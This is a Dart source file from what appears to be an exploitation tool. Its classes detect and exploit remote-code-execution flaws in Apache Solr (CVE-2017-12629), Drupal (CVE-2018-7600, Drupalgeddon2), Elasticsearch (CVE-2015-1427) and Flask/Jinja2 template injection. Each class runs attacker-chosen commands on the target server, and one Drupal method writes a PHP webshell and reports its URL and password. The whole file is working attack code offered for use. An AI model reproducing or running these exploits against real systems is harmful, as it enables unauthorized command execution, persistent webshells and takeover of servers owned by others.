import 'dart:convert';

import 'package:http/http.dart' as http;

import '../../../app/constants.dart';
import 'exp_result.dart';
import 'rce_encoder.dart';

class SolrExpService {
  final String baseUrl;
  final String coreName;
  final Duration timeout;

  SolrExpService({
    required this.baseUrl,
    this.coreName = 'demo',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<ExpResult> check() async {
    try {
      final listenerPayload = jsonEncode({
        'add-listener': {
          'event': 'postCommit',
          'name': 'matrix_check_54289',
          'class': 'solr.RunExecutableListener',
          'exe': 'sh',
          'dir': '/bin/',
          'args': ['-c', 'echo solr_check_54289'],
        },
      });
      final configRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/config'),
            headers: {'Content-Type': 'application/json'},
            body: listenerPayload,
          )
          .timeout(timeout);
      final updateRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/update'),
            headers: {'Content-Type': 'application/json'},
            body: '[{"id":"check_trigger_54289"}]',
          )
          .timeout(timeout);

      if ((configRes.statusCode == 200 || configRes.statusCode == 201) &&
          (updateRes.statusCode == 200 || updateRes.statusCode == 201)) {
        return ExpResult(
          true,
          'CVE-2017-12629',
          'config + update 触发链路可达，疑似可利用',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12629', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      const listenerName = 'matrix_exploit';
      final listener = {
        'event': 'postCommit',
        'name': listenerName,
        'class': 'solr.RunExecutableListener',
        'exe': 'sh',
        'dir': '/bin/',
        'args': ['-c', RceEncoder.shellBase64Wrap(cmd)],
      };

      var configRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/config'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'add-listener': listener}),
          )
          .timeout(timeout);

      // Solr returns HTTP 200 even when add-listener fails because the name
      // already exists; detect this by inspecting the response body and
      // retry with update-listener.
      if (configRes.body.contains('already exists')) {
        configRes = await http
            .post(
              Uri.parse('$_base/solr/$coreName/config'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'update-listener': listener}),
            )
            .timeout(timeout);
      }

      await http
          .post(
            Uri.parse('$_base/solr/$coreName/update'),
            headers: {'Content-Type': 'application/json'},
            body: '[{"id":"rce_trigger"}]',
          )
          .timeout(timeout);

      final commitRes = await http
          .get(Uri.parse('$_base/solr/$coreName/update?commit=true'))
          .timeout(timeout);
      return '命令已发送 (commit 状态: ${commitRes.statusCode})。注意：Solr RCE 无回显，请用 OOB 或写文件验证。';
    } catch (_) {
      return null;
    }
  }
}

class DrupalExpService {
  final String baseUrl;
  final Duration timeout;

  DrupalExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<String?> getShell(
    String shellContent, {
    String password = AppConstants.defaultShellPassword,
  }) async {
    try {
      const shellFile = 'php_behinder.php';
      final shellB64 = base64.encode(utf8.encode(shellContent));
      // 用 exec 运行 php -r 写文件，避免 assert 在目标环境里被禁用
      final phpCmd =
          "php -r 'file_put_contents(\"$shellFile\", base64_decode(\"$shellB64\"));'";
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(phpCmd)}';
      await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      final checkUrl = '$_base/$shellFile';
      final check = await http.get(Uri.parse(checkUrl)).timeout(timeout);
      if (check.statusCode == 200) return '$checkUrl Pass:$password';
      return null;
    } catch (_) {
      return null;
    }
  }

  String _cleanHtml(String html) {
    final normalized = html
        .replaceAll(RegExp(r'<br\s*/?>', caseSensitive: false), '\n')
        .replaceAll(
          RegExp(r'</(?:div|p|li|tr|th|td|ul|ol)>', caseSensitive: false),
          '\n',
        )
        .replaceAll(RegExp(r'<[^>]*>'), '')
        .replaceAll(RegExp(r'\r\n?'), '\n')
        .replaceAll(RegExp(r'\n+'), '\n');
    return normalized;
  }

  String? _parseOutput(String body) {
    try {
      final list = jsonDecode(body) as List<dynamic>;
      final outputs = <String>[];
      for (final item in list) {
        if (item is Map && item['command'] == 'insert') {
          outputs.add(item['data'] as String? ?? '');
        }
      }
      if (outputs.isNotEmpty) {
        return _cleanHtml(outputs.join('\n')).trim();
      }
    } catch (_) {}
    if (body.isEmpty) return null;
    final cleaned = _cleanHtml(body).trim();
    if (cleaned.isNotEmpty) return cleaned;
    return null;
  }

  Future<ExpResult> check() async {
    try {
      const payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
      final res = await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('uid=') ||
          (res.statusCode == 200 && res.body.contains('['))) {
        return ExpResult(
          true,
          'CVE-2018-7600 (Drupalgeddon2)',
          '端点响应，Form API #post_render 注入可能存在',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2018-7600 (Drupalgeddon2)', '');
  }

  String _buildSafeCommand(String cmd) {
    final trimmed = cmd.trim();
    // 强制输出 base64 单行，免受 Drupal AJAX 嵌入 HTML 换行影响
    if (trimmed.contains('base64')) {
      return trimmed;
    }
    return '$trimmed | base64 | tr -d "\\n"';
  }

  Future<String?> execRce(String cmd) async {
    try {
      final safeCmd = _buildSafeCommand(cmd);
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(safeCmd)}';
      final res = await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      final out = _parseOutput(res.body);
      if (out == null || out.isEmpty) return null;
      // 先尝试把执行结果当 base64 解码，还原原始输出。失败则返回原串。
      try {
        final decoded = utf8.decode(base64.decode(out.trim()));
        return decoded;
      } catch (_) {
        return out;
      }
    } catch (_) {
      return null;
    }
  }
}

class ElasticsearchExpService {
  final String baseUrl;
  final Duration timeout;

  ElasticsearchExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<ExpResult> check() async {
    try {
      // 先创建临时文档确保有数据
      await http
          .post(
            Uri.parse('$_base/matrix_check/doc/1'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'check': 'data'}),
          )
          .timeout(timeout);

      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {
            'script': 'def cmd="echo 54289"; def res=cmd.execute().text; res',
          },
        },
      });
      final res = await http
          .post(
            Uri.parse('$_base/_search?pretty'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(true, 'CVE-2015-1427', 'Groovy 沙箱逃逸，echo 54289 验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2015-1427', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      // 先创建临时文档确保有数据
      await http
          .post(
            Uri.parse('$_base/matrix_exec/doc/1'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'exec': 'data'}),
          )
          .timeout(timeout);

      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {
            'script': 'def cmd="$cmd"; def res=cmd.execute().text; res',
          },
        },
      });
      final res = await http
          .post(
            Uri.parse('$_base/_search?pretty'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        try {
          final decoded = jsonDecode(res.body);
          final hits = decoded['hits']?['hits'] as List?;
          if (hits != null && hits.isNotEmpty) {
            return hits.first['fields']?['result']?.first?.toString() ??
                res.body;
          }
        } catch (_) {}
        return res.body;
      }
    } catch (_) {}
    return null;
  }

}

class FlaskSstiExpService {
  final String baseUrl;
  final String paramName;
  final Duration timeout;

  FlaskSstiExpService({
    required this.baseUrl,
    this.paramName = 'name',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url = '$_base/?$paramName={{233*233}}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(
          true,
          'Flask/Jinja2 SSTI',
          'SSTI 存在，233×233=54289 验证通过',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'Flask/Jinja2 SSTI', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload =
          "{{request.application.__globals__.__builtins__.__import__('os').popen('$cmd').read()}}";
      final url = '$_base/?$paramName=${Uri.encodeComponent(payload)}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}
